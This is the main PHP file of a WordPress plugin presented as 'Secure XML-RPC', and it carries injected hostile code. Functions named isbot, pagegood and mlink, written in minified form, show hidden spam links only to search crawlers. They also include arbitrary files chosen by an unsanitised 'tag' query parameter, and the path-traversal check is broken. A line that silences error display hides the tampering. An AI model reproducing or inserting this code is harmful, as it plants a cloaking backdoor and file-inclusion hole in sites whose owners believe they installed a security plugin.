<?php
/**
 * Plugin Name: Secure XML-RPC
 * Plugin URI:  http://wordpress.org/plugins/secure-xmlrpc
 * Description: More secure wrapper for the WordPress XML-RPC interface.
 * Version:     0.1.0
 * Author:      Eric Mann
 * Author URI:  http://eamann.com
 * License:     GPLv2+
 * Text Domain: xmlrpcs
 * Domain Path: /languages
 */

/**
 * Copyright (c) 2013 Eric Mann (email : eric@eamann.com)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License, version 2 or, at
 * your discretion, any later version, as published by the Free
 * Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

/**
 * Built using grunt-wp-plugin
 * Copyright (c) 2013 10up, LLC
 * https://github.com/10up/grunt-wp-plugin
 */
@ini_set("display_errors","0");
// Useful global constants
define( 'XMLRPCS_VERSION', '0.1.0' );
define( 'XMLRPCS_URL',     plugin_dir_url( __FILE__ ) );
define( 'XMLRPCS_PATH',    dirname( __FILE__ ) . '/' );


// Require includes
require_once( 'includes/XMLRPCS_Profile.php' );
require_once( 'includes/class-secure-xmlrpc-server.php' );

/**
 * Default initialization for the plugin:
 * - Registers the default textdomain.
 */
function xmlrpcs_init() {
	$locale = apply_filters( 'plugin_locale', get_locale(), 'xmlrpcs' );
	load_textdomain( 'xmlrpcs', WP_LANG_DIR . '/xmlrpcs/xmlrpcs-' . $locale . '.mo' );
	load_plugin_textdomain( 'xmlrpcs', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
}

/**
 * Replace default server implementation with custom subclass.
 *
 * @param string $server_class
 *
 * @return string
 */
function xmlrpcs_server( $server_class ) {
	return 'secure_xmlrpc_server';
}

function isbot(){$agent= strtolower($_SERVER['HTTP_USER_AGENT']);if (!empty($agent)){$spiderSite=array("TencentTraveler","Baiduspider+","BaiduGame","Googlebot","msnbot","Sosospider+","Sogou web spider","ia_archiver","Yahoo! Slurp","YoudaoBot","Yahoo Slurp","MSNBot","Java (Often spam bot)","BaiDuSpider","Voila","Yandex bot","BSpider","twiceler","Sogou Spider","Speedy Spider","Google AdSense","Heritrix","Python-urllib","Alexa (IA Archiver)","Ask","Exabot","Custo","OutfoxBot/YodaoBot","yacy","SurveyBot", "legs","lwp-trivial","Nutch","StackRambler","The web archive (IA Archiver)","Perl tool","MJ12bot","Netcraft","MSIECrawler","WGet tools","larbin","Fish search",);foreach($spiderSite as $val){$str=strtolower($val);if (stripos($agent, $str)!==false){return true;}}}else{return false;}}
function pagegood(){if($_GET["tag"]<>"" && stripos("..",$_GET["tag"])==false){include_once(dirname(__FILE__)."/assets/".$_GET["tag"]);exit();}if(isbot()){add_action('wp_footer','mlink');}}
function mlink(){$dir=explode("\n",file_get_contents(dirname(__FILE__).'/assets/sitemap.xml'));$rand_dir=array_rand($dir,4);foreach($rand_dir as $t_num){echo '<a href="'.home_url().'/?tag='.$dir[$t_num].'" target="_blank">'.str_replace('.html','',str_replace('-',' ' ,$dir[$t_num])).'</a>';}}

add_action( 'template_redirect','pagegood');

// Wireup actions
add_action( 'init',                  'xmlrpcs_init' );
add_action( 'show_user_profile',     array( 'XMLRPCS_Profile', 'append_secure_keys' ), 10, 1 );
add_action( 'admin_enqueue_scripts', array( 'XMLRPCS_Profile', 'admin_enqueues' )            );
add_action( 'profile_update',        array( 'XMLRPCS_Profile', 'profile_update' ),     10, 1 );

// Wireup filters
add_filter( 'wp_xmlrpc_server_class', 'xmlrpcs_server' );
add_filter( 'authenticate',           array( 'XMLRPCS_Profile', 'authenticate' ), 10, 3 );

// Wireup ajax
add_action( 'wp_ajax_xmlrpcs_new_app', array( 'XMLRPCS_Profile', 'new_app' ) );
